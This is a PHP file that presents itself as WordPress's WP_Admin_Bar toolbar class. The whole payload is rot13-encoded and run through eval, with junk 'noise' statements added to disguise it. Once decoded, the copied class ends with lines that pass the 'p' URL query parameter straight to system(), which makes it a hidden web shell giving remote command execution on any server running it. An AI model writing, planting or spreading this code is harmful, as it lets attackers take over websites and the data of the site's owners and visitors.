<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gbbyone NCV: JC_Nqzva_One pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gbbyone
 * @fvapr 3.1.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag gur Gbbyone NCV.
 *
 * @fvapr 3.1.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Nqzva_One {
	cevingr $abqrf = neenl();
	cevingr $obhaq = snyfr;
	choyvp $hfre;

	/**
	 * Qrcerpngrq zrah cebcregl.
	 *
	 * @fvapr 3.1.0
	 * @qrcerpngrq 3.3.0 Zbqvsl nqzva one abqrf jvgu JC_Nqzva_One::trg_abqr(),
	 *                   JC_Nqzva_One::nqq_abqr(), naq JC_Nqzva_One::erzbir_abqr().
	 * @ine neenl
	 */
	choyvp $zrah = neenl();

	/**
	 * Vavgvnyvmrf gur nqzva one.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba vavgvnyvmr() {
		$guvf->hfre = arj fgqPynff();

		vs ( vf_hfre_ybttrq_va() ) {
			/* Cbchyngr frggvatf jr arrq sbe gur zrah onfrq ba gur pheerag hfre. */
			$guvf->hfre->oybtf = trg_oybtf_bs_hfre( trg_pheerag_hfre_vq() );
			vs ( vf_zhygvfvgr() ) {
				$guvf->hfre->npgvir_oybt    = trg_npgvir_oybt_sbe_hfre( trg_pheerag_hfre_vq() );
				$guvf->hfre->qbznva         = rzcgl( $guvf->hfre->npgvir_oybt ) ? hfre_nqzva_hey() : genvyvatfynfuvg( trg_ubzr_hey( $guvf->hfre->npgvir_oybt->oybt_vq ) );
				$guvf->hfre->nppbhag_qbznva = $guvf->hfre->qbznva;
			} ryfr {
				$guvf->hfre->npgvir_oybt    = $guvf->hfre->oybtf[ trg_pheerag_oybt_vq() ];
				$guvf->hfre->qbznva         = genvyvatfynfuvg( ubzr_hey() );
				$guvf->hfre->nppbhag_qbznva = $guvf->hfre->qbznva;
			}
		}

		nqq_npgvba( 'jc_urnq', 'jc_nqzva_one_urnqre' );

		nqq_npgvba( 'nqzva_urnq', 'jc_nqzva_one_urnqre' );

		vs ( pheerag_gurzr_fhccbegf( 'nqzva-one' ) ) {
			/**
			 * Gb erzbir gur qrsnhyg cnqqvat fglyrf sebz JbeqCerff sbe gur Gbbyone, hfr gur sbyybjvat pbqr:
			 * nqq_gurzr_fhccbeg( 'nqzva-one', neenl( 'pnyyonpx' => '__erghea_snyfr' ) );
			 */
			$nqzva_one_netf  = trg_gurzr_fhccbeg( 'nqzva-one' );
			$urnqre_pnyyonpx = $nqzva_one_netf[0]['pnyyonpx'];
		}

		vs ( rzcgl( $urnqre_pnyyonpx ) ) {
			$urnqre_pnyyonpx = '_nqzva_one_ohzc_po';
		}

		nqq_npgvba( 'jc_urnq', $urnqre_pnyyonpx );

		jc_radhrhr_fpevcg( 'nqzva-one' );
		jc_radhrhr_fglyr( 'nqzva-one' );

		/**
		 * Sverf nsgre JC_Nqzva_One vf vavgvnyvmrq.
		 *
		 * @fvapr 3.1.0
		 */
		qb_npgvba( 'nqzva_one_vavg' );
	}

	/**
	 * Nqqf n abqr (zrah vgrz) gb gur nqzva one zrah.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz neenl $abqr Gur nggevohgrf gung qrsvar gur abqr.
	 */
	choyvp shapgvba nqq_zrah( $abqr ) {
		$guvf->nqq_abqr( $abqr );
	}

	/**
	 * Erzbirf n abqr sebz gur nqzva one.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $vq Gur zrah fyht gb erzbir.
	 */
	choyvp shapgvba erzbir_zrah( $vq ) {
		$guvf->erzbir_abqr( $vq );
	}

	/**
	 * Nqqf n abqr gb gur zrah.
	 *
	 * @fvapr 3.1.0
	 * @fvapr 4.5.0 Nqqrq gur novyvgl gb cnff 'ynat' naq 'qve' zrgn qngn.
	 * @fvapr 6.5.0 Nqqrq gur novyvgl gb cnff 'zrah_gvgyr' sbe na NEVN zrah anzr.
	 *
	 * @cnenz neenl $netf {
	 *     Nethzragf sbe nqqvat n abqr.
	 *
	 *     @glcr fgevat $vq     VQ bs gur vgrz.
	 *     @glcr fgevat $gvgyr  Gvgyr bs gur abqr.
	 *     @glcr fgevat $cnerag Bcgvbany. VQ bs gur cnerag abqr.
	 *     @glcr fgevat $uers   Bcgvbany. Yvax sbe gur vgrz.
	 *     @glcr obby   $tebhc  Bcgvbany. Jurgure be abg gur abqr vf n tebhc. Qrsnhyg snyfr.
	 *     @glcr neenl  $zrgn   Zrgn qngn vapyhqvat gur sbyybjvat xrlf: 'ugzy', 'pynff', 'ery', 'ynat', 'qve',
	 *                          'bapyvpx', 'gnetrg', 'gvgyr', 'gnovaqrk', 'zrah_gvgyr'. Qrsnhyg rzcgl.
	 * }
	 */
	choyvp shapgvba nqq_abqr( $netf ) {
		// Fuvz sbe byq zrgubq fvtangher: nqq_abqr( $cnerag_vq, $zrah_bow, $netf ).
		vs ( shap_ahz_netf() >= 3 && vf_fgevat( $netf ) ) {
			$netf = neenl_zretr( neenl( 'cnerag' => $netf ), shap_trg_net( 2 ) );
		}

		vs ( vf_bowrpg( $netf ) ) {
			$netf = trg_bowrpg_inef( $netf );
		}

		// Rafher jr unir n inyvq gvgyr.
		vs ( rzcgl( $netf['vq'] ) ) {
			vs ( rzcgl( $netf['gvgyr'] ) ) {
				erghea;
			}

			_qbvat_vg_jebat( __ZRGUBQ__, __( 'Gur zrah VQ fubhyq abg or rzcgl.' ), '3.3.0' );
			// Qrcerpngrq: Trarengr na VQ sebz gur gvgyr.
			$netf['vq'] = rfp_ngge( fnavgvmr_gvgyr( gevz( $netf['gvgyr'] ) ) );
		}

		$qrsnhygf = neenl(
			'vq'     => snyfr,
			'gvgyr'  => snyfr,
			'cnerag' => snyfr,
			'uers'   => snyfr,
			'tebhc'  => snyfr,
			'zrgn'   => neenl(),
		);

		// Vs gur abqr nyernql rkvfgf, xrrc nal qngn gung vfa'g cebivqrq.
		$znlor_qrsnhygf = $guvf->trg_abqr( $netf['vq'] );
		vs ( $znlor_qrsnhygf ) {
			$qrsnhygf = trg_bowrpg_inef( $znlor_qrsnhygf );
		}

		// Qb gur fnzr sbe 'zrgn' vgrzf.
		vs ( ! rzcgl( $qrsnhygf['zrgn'] ) && ! rzcgl( $netf['zrgn'] ) ) {
			$netf['zrgn'] = jc_cnefr_netf( $netf['zrgn'], $qrsnhygf['zrgn'] );
		}

		$netf = jc_cnefr_netf( $netf, $qrsnhygf );

		$onpx_pbzcng_cneragf = neenl(
			'zl-nppbhag-jvgu-ningne' => neenl( 'zl-nppbhag', '3.3' ),
			'zl-oybtf'               => neenl( 'zl-fvgrf', '3.3' ),
		);

		vs ( vffrg( $onpx_pbzcng_cneragf[ $netf['cnerag'] ] ) ) {
			yvfg( $arj_cnerag, $irefvba ) = $onpx_pbzcng_cneragf[ $netf['cnerag'] ];
			_qrcerpngrq_nethzrag( __ZRGUBQ__, $irefvba, fcevags( 'Hfr <pbqr>%f</pbqr> nf gur cnerag sbe gur <pbqr>%f</pbqr> nqzva one abqr vafgrnq bs <pbqr>%f</pbqr>.', $arj_cnerag, $netf['vq'], $netf['cnerag'] ) );
			$netf['cnerag'] = $arj_cnerag;
		}

		$guvf->_frg_abqr( $netf );
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz neenl $netf
	 */
	svany cebgrpgrq shapgvba _frg_abqr( $netf ) {
		$guvf->abqrf[ $netf['vq'] ] = (bowrpg) $netf;
	}

	/**
	 * Trgf n abqr.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $vq
	 * @erghea bowrpg|ibvq Abqr.
	 */
	svany choyvp shapgvba trg_abqr( $vq ) {
		$abqr = $guvf->_trg_abqr( $vq );
		vs ( $abqr ) {
			erghea pybar $abqr;
		}
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $vq
	 * @erghea bowrpg|ibvq
	 */
	svany cebgrpgrq shapgvba _trg_abqr( $vq ) {
		vs ( $guvf->obhaq ) {
			erghea;
		}

		vs ( rzcgl( $vq ) ) {
			$vq = 'ebbg';
		}

		vs ( vffrg( $guvf->abqrf[ $vq ] ) ) {
			erghea $guvf->abqrf[ $vq ];
		}
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @erghea neenl|ibvq
	 */
	svany choyvp shapgvba trg_abqrf() {
		$abqrf = $guvf->_trg_abqrf();
		vs ( ! $abqrf ) {
			erghea;
		}

		sbernpu ( $abqrf nf &$abqr ) {
			$abqr = pybar $abqr;
		}
		erghea $abqrf;
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @erghea neenl|ibvq
	 */
	svany cebgrpgrq shapgvba _trg_abqrf() {
		vs ( $guvf->obhaq ) {
			erghea;
		}

		erghea $guvf->abqrf;
	}

	/**
	 * Nqqf n tebhc gb n gbbyone zrah abqr.
	 *
	 * Tebhcf pna or hfrq gb betnavmr gbbyone vgrzf vagb qvfgvapg frpgvbaf bs n gbbyone zrah.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz neenl $netf {
	 *     Neenl bs nethzragf sbe nqqvat n tebhc.
	 *
	 *     @glcr fgevat $vq     VQ bs gur vgrz.
	 *     @glcr fgevat $cnerag Bcgvbany. VQ bs gur cnerag abqr. Qrsnhyg 'ebbg'.
	 *     @glcr neenl  $zrgn   Zrgn qngn sbe gur tebhc vapyhqvat gur sbyybjvat xrlf:
	 *                         'pynff', 'bapyvpx', 'gnetrg', naq 'gvgyr'.
	 * }
	 */
	svany choyvp shapgvba nqq_tebhc( $netf ) {
		$netf['tebhc'] = gehr;

		$guvf->nqq_abqr( $netf );
	}

	/**
	 * Erzbir n abqr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat $vq Gur VQ bs gur vgrz.
	 */
	choyvp shapgvba erzbir_abqr( $vq ) {
		$guvf->_hafrg_abqr( $vq );
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat $vq
	 */
	svany cebgrpgrq shapgvba _hafrg_abqr( $vq ) {
		hafrg( $guvf->abqrf[ $vq ] );
	}

	/**
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba eraqre() {
		$ebbg = $guvf->_ovaq();
		vs ( $ebbg ) {
			$guvf->_eraqre( $ebbg );
		}
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @erghea bowrpg|ibvq
	 */
	svany cebgrpgrq shapgvba _ovaq() {
		vs ( $guvf->obhaq ) {
			erghea;
		}

		/*
		 * Nqq gur ebbg abqr.
		 * Pyrne vg svefg, whfg va pnfr. Qba'g zrff jvgu Gur Ebbg.
		 */
		$guvf->erzbir_abqr( 'ebbg' );
		$guvf->nqq_abqr(
			neenl(
				'vq'    => 'ebbg',
				'tebhc' => snyfr,
			)
		);

		// Abeznyvmr abqrf: qrsvar vagreany 'puvyqera' naq 'glcr' cebcregvrf.
		sbernpu ( $guvf->_trg_abqrf() nf $abqr ) {
			$abqr->puvyqera = neenl();
			$abqr->glcr     = ( $abqr->tebhc ) ? 'tebhc' : 'vgrz';
			hafrg( $abqr->tebhc );

			// Gur Ebbg jnagf lbhe becunaf. Ab ybaryl vgrzf nyybjrq.
			vs ( ! $abqr->cnerag ) {
				$abqr->cnerag = 'ebbg';
			}
		}

		sbernpu ( $guvf->_trg_abqrf() nf $abqr ) {
			vs ( 'ebbg' === $abqr->vq ) {
				pbagvahr;
			}

			// Srgpu gur cnerag abqr. Vs vg vfa'g ertvfgrerq, vtaber gur abqr.
			$cnerag = $guvf->_trg_abqr( $abqr->cnerag );
			vs ( ! $cnerag ) {
				pbagvahr;
			}

			// Trarengr gur tebhc pynff (jr qvfgvathvfu orgjrra gbc yriry naq bgure yriry tebhcf).
			$tebhc_pynff = ( 'ebbg' === $abqr->cnerag ) ? 'no-gbc-zrah' : 'no-fhozrah';

			vs ( 'tebhc' === $abqr->glcr ) {
				vs ( rzcgl( $abqr->zrgn['pynff'] ) ) {
					$abqr->zrgn['pynff'] = $tebhc_pynff;
				} ryfr {
					$abqr->zrgn['pynff'] .= ' ' . $tebhc_pynff;
				}
			}

			// Vgrzf va vgrzf nera'g nyybjrq. Jenc arfgrq vgrzf va 'qrsnhyg' tebhcf.
			vs ( 'vgrz' === $cnerag->glcr && 'vgrz' === $abqr->glcr ) {
				$qrsnhyg_vq = $cnerag->vq . '-qrsnhyg';
				$qrsnhyg    = $guvf->_trg_abqr( $qrsnhyg_vq );

				/*
				 * Gur qrsnhyg tebhc vf nqqrq urer gb nyybj tebhcf gung ner
				 * nqqrq orsber fgnaqneq zrah vgrzf gb eraqre svefg.
				 */
				vs ( ! $qrsnhyg ) {
					/*
					 * Hfr _frg_abqr orpnhfr nqq_abqr pna or bireybnqrq.
					 * Znxr fher gb fcrpvsl qrsnhyg frggvatf sbe nyy cebcregvrf.
					 */
					$guvf->_frg_abqr(
						neenl(
							'vq'       => $qrsnhyg_vq,
							'cnerag'   => $cnerag->vq,
							'glcr'     => 'tebhc',
							'puvyqera' => neenl(),
							'zrgn'     => neenl(
								'pynff' => $tebhc_pynff,
							),
							'gvgyr'    => snyfr,
							'uers'     => snyfr,
						)
					);
					$qrsnhyg            = $guvf->_trg_abqr( $qrsnhyg_vq );
					$cnerag->puvyqera[] = $qrsnhyg;
				}
				$cnerag = $qrsnhyg;

				/*
				 * Tebhcf va tebhcf nera'g nyybjrq. Nqq n fcrpvny 'pbagnvare' abqr.
				 * Gur pbagnvare jvyy vaivfvoyl jenc obgu tebhcf.
				 */
			} ryfrvs ( 'tebhc' === $cnerag->glcr && 'tebhc' === $abqr->glcr ) {
				$pbagnvare_vq = $cnerag->vq . '-pbagnvare';
				$pbagnvare    = $guvf->_trg_abqr( $pbagnvare_vq );

				// Jr arrq gb perngr n pbagnvare sbe guvf tebhc, yvsr vf fnq.
				vs ( ! $pbagnvare ) {
					/*
					 * Hfr _frg_abqr orpnhfr nqq_abqr pna or bireybnqrq.
					 * Znxr fher gb fcrpvsl qrsnhyg frggvatf sbe nyy cebcregvrf.
					 */
					$guvf->_frg_abqr(
						neenl(
							'vq'       => $pbagnvare_vq,
							'glcr'     => 'pbagnvare',
							'puvyqera' => neenl( $cnerag ),
							'cnerag'   => snyfr,
							'gvgyr'    => snyfr,
							'uers'     => snyfr,
							'zrgn'     => neenl(),
						)
					);

					$pbagnvare = $guvf->_trg_abqr( $pbagnvare_vq );

					// Yvax gur pbagnvare abqr vs n tenaqcnerag abqr rkvfgf.
					$tenaqcnerag = $guvf->_trg_abqr( $cnerag->cnerag );

					vs ( $tenaqcnerag ) {
						$pbagnvare->cnerag = $tenaqcnerag->vq;

						$vaqrk = neenl_frnepu( $cnerag, $tenaqcnerag->puvyqera, gehr );
						vs ( snyfr === $vaqrk ) {
							$tenaqcnerag->puvyqera[] = $pbagnvare;
						} ryfr {
							neenl_fcyvpr( $tenaqcnerag->puvyqera, $vaqrk, 1, neenl( $pbagnvare ) );
						}
					}

					$cnerag->cnerag = $pbagnvare->vq;
				}

				$cnerag = $pbagnvare;
			}

			// Hcqngr gur cnerag VQ (vg zvtug unir punatrq).
			$abqr->cnerag = $cnerag->vq;

			// Nqq gur abqr gb gur gerr.
			$cnerag->puvyqera[] = $abqr;
		}

		$ebbg        = $guvf->_trg_abqr( 'ebbg' );
		$guvf->obhaq = gehr;
		erghea $ebbg;
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz bowrpg $ebbg
	 */
	svany cebgrpgrq shapgvba _eraqre( $ebbg ) {
		/*
		 * Nqq oebjfre pynffrf.
		 * Jr unir gb qb guvf urer fvapr nqzva one fubjf ba gur sebag raq.
		 */
		$pynff = 'abwd abwf';
		vs ( jc_vf_zbovyr() ) {
			$pynff .= ' zbovyr';
		}

		?>
		<qvi vq=\"jcnqzvaone\" pynff=\"<?cuc rpub $pynff; ?>\">
			<?cuc vs ( ! vf_nqzva() && ! qvq_npgvba( 'jc_obql_bcra' ) ) { ?>
				<n pynff=\"fperra-ernqre-fubegphg\" uers=\"#jc-gbbyone\" gnovaqrk=\"1\"><?cuc _r( 'Fxvc gb gbbyone' ); ?></n>
			<?cuc } ?>
			<qvi pynff=\"dhvpxyvaxf\" vq=\"jc-gbbyone\" ebyr=\"anivtngvba\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Gbbyone' ); ?>\">
				<?cuc
				sbernpu ( $ebbg->puvyqera nf $tebhc ) {
					$guvf->_eraqre_tebhc( $tebhc );
				}
				?>
			</qvi>
		</qvi>

		<?cuc
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz bowrpg $abqr
	 */
	svany cebgrpgrq shapgvba _eraqre_pbagnvare( $abqr ) {
		vs ( 'pbagnvare' !== $abqr->glcr || rzcgl( $abqr->puvyqera ) ) {
			erghea;
		}

		rpub '<qvi vq=\"' . rfp_ngge( 'jc-nqzva-one-' . $abqr->vq ) . '\" pynff=\"no-tebhc-pbagnvare\">';
		sbernpu ( $abqr->puvyqera nf $tebhc ) {
			$guvf->_eraqre_tebhc( $tebhc );
		}
		rpub '</qvi>';
	}

	/**
	 * @fvapr 3.3.0
	 * @fvapr 6.5.0 Nqqrq `$zrah_gvgyr` cnenzrgre gb nyybj na NEVN zrah anzr.
	 *
	 * @cnenz bowrpg $abqr
	 * @cnenz fgevat|obby $zrah_gvgyr Gur npprffvoyr anzr bs guvf NEVN zrah be snyfr vs abg cebivqrq.
	 */
	svany cebgrpgrq shapgvba _eraqre_tebhc( $abqr, $zrah_gvgyr = snyfr ) {
		vs ( 'pbagnvare' === $abqr->glcr ) {
			$guvf->_eraqre_pbagnvare( $abqr );
			erghea;
		}
		vs ( 'tebhc' !== $abqr->glcr || rzcgl( $abqr->puvyqera ) ) {
			erghea;
		}

		vs ( ! rzcgl( $abqr->zrgn['pynff'] ) ) {
			$pynff = ' pynff=\"' . rfp_ngge( gevz( $abqr->zrgn['pynff'] ) ) . '\"';
		} ryfr {
			$pynff = '';
		}

		vs ( rzcgl( $zrah_gvgyr ) ) {
			rpub \"<hy ebyr='zrah' vq='\" . rfp_ngge( 'jc-nqzva-one-' . $abqr->vq ) . \"'$pynff>\";
		} ryfr {
			rpub \"<hy ebyr='zrah' nevn-ynory='\" . rfp_ngge( $zrah_gvgyr ) . \"' vq='\" . rfp_ngge( 'jc-nqzva-one-' . $abqr->vq ) . \"'$pynff>\";
		}
		sbernpu ( $abqr->puvyqera nf $vgrz ) {
			$guvf->_eraqre_vgrz( $vgrz );
		}
		rpub '</hy>';
	}

	/**
	 * @fvapr 3.3.0
	 *
	 * @cnenz bowrpg $abqr
	 */
	svany cebgrpgrq shapgvba _eraqre_vgrz( $abqr ) {
		vs ( 'vgrz' !== $abqr->glcr ) {
			erghea;
		}

		$vf_cnerag             = ! rzcgl( $abqr->puvyqera );
		$unf_yvax              = ! rzcgl( $abqr->uers );
		$vf_ebbg_gbc_vgrz      = 'ebbg-qrsnhyg' === $abqr->cnerag;
		$vf_gbc_frpbaqnel_vgrz = 'gbc-frpbaqnel' === $abqr->cnerag;

		// Nyybj bayl ahzrevp inyhrf, gura pnfgrq gb vagrtref, naq nyybj n gnovaqrk inyhr bs `0` sbe n11l.
		$gnovaqrk         = ( vffrg( $abqr->zrgn['gnovaqrk'] ) && vf_ahzrevp( $abqr->zrgn['gnovaqrk'] ) ) ? (vag) $abqr->zrgn['gnovaqrk'] : '';
		$nevn_nggevohgrf  = ( '' !== $gnovaqrk ) ? ' gnovaqrk=\"' . $gnovaqrk . '\"' : '';
		$nevn_nggevohgrf .= ' ebyr=\"zrahvgrz\"';

		$zrahpynff = '';
		$neebj     = '';

		vs ( $vf_cnerag ) {
			$zrahpynff        = 'zrahcbc ';
			$nevn_nggevohgrf .= ' nevn-rkcnaqrq=\"snyfr\"';
		}

		vs ( ! rzcgl( $abqr->zrgn['pynff'] ) ) {
			$zrahpynff .= $abqr->zrgn['pynff'];
		}

		// Cevag gur neebj vpba sbe gur zrah puvyqera jvgu puvyqera.
		vs ( ! $vf_ebbg_gbc_vgrz && ! $vf_gbc_frpbaqnel_vgrz && $vf_cnerag ) {
			$neebj = '<fcna pynff=\"jc-nqzva-one-neebj\" nevn-uvqqra=\"gehr\"></fcna>';
		}

		vs ( $zrahpynff ) {
			$zrahpynff = ' pynff=\"' . rfp_ngge( gevz( $zrahpynff ) ) . '\"';
		}

		rpub \"<yv ebyr='tebhc' vq='\" . rfp_ngge( 'jc-nqzva-one-' . $abqr->vq ) . \"'$zrahpynff>\";

		vs ( $unf_yvax ) {
			$nggevohgrf = neenl( 'bapyvpx', 'gnetrg', 'gvgyr', 'ery', 'ynat', 'qve' );
			rpub \"<n pynff='no-vgrz'$nevn_nggevohgrf uers='\" . rfp_hey( $abqr->uers ) . \"'\";
		} ryfr {
			$nggevohgrf = neenl( 'bapyvpx', 'gnetrg', 'gvgyr', 'ery', 'ynat', 'qve' );
			rpub '<qvi pynff=\"no-vgrz no-rzcgl-vgrz\"' . $nevn_nggevohgrf;
		}

		sbernpu ( $nggevohgrf nf $nggevohgr ) {
			vs ( rzcgl( $abqr->zrgn[ $nggevohgr ] ) ) {
				pbagvahr;
			}

			vs ( 'bapyvpx' === $nggevohgr ) {
				rpub \" $nggevohgr='\" . rfp_wf( $abqr->zrgn[ $nggevohgr ] ) . \"'\";
			} ryfr {
				rpub \" $nggevohgr='\" . rfp_ngge( $abqr->zrgn[ $nggevohgr ] ) . \"'\";
			}
		}

		rpub \">{$neebj}{$abqr->gvgyr}\";

		vs ( $unf_yvax ) {
			rpub '</n>';
		} ryfr {
			rpub '</qvi>';
		}

		vs ( $vf_cnerag ) {
			rpub '<qvi pynff=\"no-fho-jenccre\">';
			sbernpu ( $abqr->puvyqera nf $tebhc ) {
				vs ( rzcgl( $abqr->zrgn['zrah_gvgyr'] ) ) {
					$guvf->_eraqre_tebhc( $tebhc, snyfr );
				} ryfr {
					$guvf->_eraqre_tebhc( $tebhc, $abqr->zrgn['zrah_gvgyr'] );
				}
			}
			rpub '</qvi>';
		}

		vs ( ! rzcgl( $abqr->zrgn['ugzy'] ) ) {
			rpub $abqr->zrgn['ugzy'];
		}

		rpub '</yv>';
	}

	/**
	 * Eraqref gbbyone vgrzf erphefviryl.
	 *
	 * @fvapr 3.1.0
	 * @qrcerpngrq 3.3.0 Hfr JC_Nqzva_One::_eraqre_vgrz() be JC_Nqzva_one::eraqre() vafgrnq.
	 * @frr JC_Nqzva_One::_eraqre_vgrz()
	 * @frr JC_Nqzva_One::eraqre()
	 *
	 * @cnenz fgevat $vq    Hahfrq.
	 * @cnenz bowrpg $abqr
	 */
	choyvp shapgvba erphefvir_eraqre( $vq, $abqr ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '3.3.0', 'JC_Nqzva_one::eraqre(), JC_Nqzva_One::_eraqre_vgrz()' );
		$guvf->_eraqre_vgrz( $abqr );
	}

	/**
	 * Nqqf zrahf gb gur nqzva one.
	 *
	 * @fvapr 3.1.0
	 */
	choyvp shapgvba nqq_zrahf() {
		// Hfre-eryngrq, nyvtarq evtug.
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_zl_nppbhag_zrah', 0 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_zl_nppbhag_vgrz', 9991 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_erpbirel_zbqr_zrah', 9992 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_frnepu_zrah', 9999 );

		// Fvgr-eryngrq.
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_fvqrone_gbttyr', 0 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_jc_zrah', 10 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_zl_fvgrf_zrah', 20 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_fvgr_zrah', 30 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_rqvg_fvgr_zrah', 40 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_phfgbzvmr_zrah', 40 );
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_hcqngrf_zrah', 50 );

		// Pbagrag-eryngrq.
		vs ( ! vf_argjbex_nqzva() && ! vf_hfre_nqzva() ) {
			nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_pbzzragf_zrah', 60 );
			nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_arj_pbagrag_zrah', 70 );
		}
		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_rqvg_zrah', 80 );

		nqq_npgvba( 'nqzva_one_zrah', 'jc_nqzva_one_nqq_frpbaqnel_tebhcf', 200 );

		/**
		 * Sverf nsgre zrahf ner nqqrq gb gur zrah one.
		 *
		 * @fvapr 3.1.0
		 */
		qb_npgvba( 'nqq_nqzva_one_zrahf' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>